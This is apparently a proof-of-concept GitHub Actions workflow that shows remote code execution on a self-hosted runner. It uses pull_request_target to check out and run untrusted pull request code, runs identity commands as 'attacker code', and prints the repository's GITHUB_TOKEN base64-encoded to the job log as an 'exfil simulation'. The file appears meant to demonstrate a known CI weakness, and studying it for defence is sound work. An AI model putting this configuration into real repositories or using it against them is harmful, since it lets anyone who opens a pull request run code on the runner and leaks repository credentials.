name: PoC - Self Hosted RCE

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  rce:
    runs-on: self-hosted

    steps:
      - name: Checkout PR code (vulnerable)
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Simulate attacker code execution
        run: |
          echo "[+] Running attacker-controlled code"
          whoami
          id
          hostname

      - name: Exfil simulation (safe)
        run: |
          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" | base64
